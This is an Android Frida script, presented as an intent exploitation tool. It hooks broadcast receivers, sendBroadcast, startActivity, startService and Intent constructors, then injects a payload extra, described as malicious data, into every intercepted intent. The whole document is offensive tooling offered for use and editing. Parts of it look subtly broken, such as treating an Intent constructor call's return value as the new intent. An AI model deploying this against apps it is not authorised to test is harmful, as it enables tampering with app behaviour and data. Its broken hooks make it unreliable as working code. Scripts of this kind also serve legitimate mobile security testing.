Java.perform(function() {
    console.log("[*] Starting Broadcast Receiver and Intent Exploitation Script...");

    // === Helper function to inject payloads into Intents ===
    function injectIntentPayload(intent) {
        var payload = "InjectedPayload"; // Modify as needed
        intent.putExtra("injected_key", payload); // Add an extra with malicious data
        return intent;
    }

    // === Hook BroadcastReceiver to capture incoming broadcasts ===
    try {
        var BroadcastReceiver = Java.use("android.content.BroadcastReceiver");

        BroadcastReceiver.onReceive.implementation = function(context, intent) {
            var action = intent.getAction();
            console.log("[*] Received broadcast with action: " + action);

            // Inspect extras in the incoming Intent
            var extras = intent.getExtras();
            if (extras) {
                var keys = extras.keySet().toArray();
                for (var i = 0; i < keys.length; i++) {
                    console.log("[*] Intent Extra: " + keys[i] + " = " + extras.get(keys[i]));
                }
            }

            // Inject malicious payload into the Intent
            var modifiedIntent = injectIntentPayload(intent);
            console.log("[*] Injected payload into incoming Intent.");

            // Call the original onReceive method
            this.onReceive(context, modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking BroadcastReceiver: " + err);
    }

    // === Hook Context.sendBroadcast to intercept outgoing broadcasts ===
    try {
        var Context = Java.use("android.content.Context");

        Context.sendBroadcast.overload("android.content.Intent").implementation = function(intent) {
            var action = intent.getAction();
            console.log("[*] Outgoing broadcast with action: " + action);

            // Inject payload into outgoing Intent
            var modifiedIntent = injectIntentPayload(intent);
            console.log("[*] Injected payload into outgoing broadcast.");

            return this.sendBroadcast(modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking Context.sendBroadcast: " + err);
    }

    // === Hook Intent constructor to capture new intents ===
    try {
        var Intent = Java.use("android.content.Intent");

        // Capture intent creation
        Intent.$init.overload("java.lang.String").implementation = function(action) {
            console.log("[*] Creating new Intent with action: " + action);
            var newIntent = this.$init(action);

            // Inject payload into the newly created Intent
            newIntent = injectIntentPayload(newIntent);
            console.log("[*] Injected payload into new Intent.");

            return newIntent;
        };

        // Capture intent creation with action and URI
        Intent.$init.overload("java.lang.String", "android.net.Uri").implementation = function(action, uri) {
            console.log("[*] Creating new Intent with action: " + action + ", URI: " + uri);
            var newIntent = this.$init(action, uri);

            // Inject payload into the newly created Intent
            newIntent = injectIntentPayload(newIntent);
            console.log("[*] Injected payload into new Intent with URI.");

            return newIntent;
        };
    } catch (err) {
        console.log("[!] Error hooking Intent constructor: " + err);
    }

    // === Hook Activity.startActivity to capture intent-based navigation ===
    try {
        var Activity = Java.use("android.app.Activity");

        Activity.startActivity.overload("android.content.Intent").implementation = function(intent) {
            var action = intent.getAction();
            console.log("[*] startActivity called with action: " + action);

            // Inject payload into the Intent
            var modifiedIntent = injectIntentPayload(intent);
            console.log("[*] Injected payload into Intent for startActivity.");

            return this.startActivity(modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking Activity.startActivity: " + err);
    }

    // === Hook Context.startService to capture service-bound Intents ===
    try {
        Context.startService.overload("android.content.Intent").implementation = function(intent) {
            var action = intent.getAction();
            console.log("[*] startService called with action: " + action);

            // Inject payload into the Intent
            var modifiedIntent = injectIntentPayload(intent);
            console.log("[*] Injected payload into Intent for startService.");

            return this.startService(modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking Context.startService: " + err);
    }

    console.log("[*] Broadcast Receiver and Intent Exploitation Script loaded successfully.");
});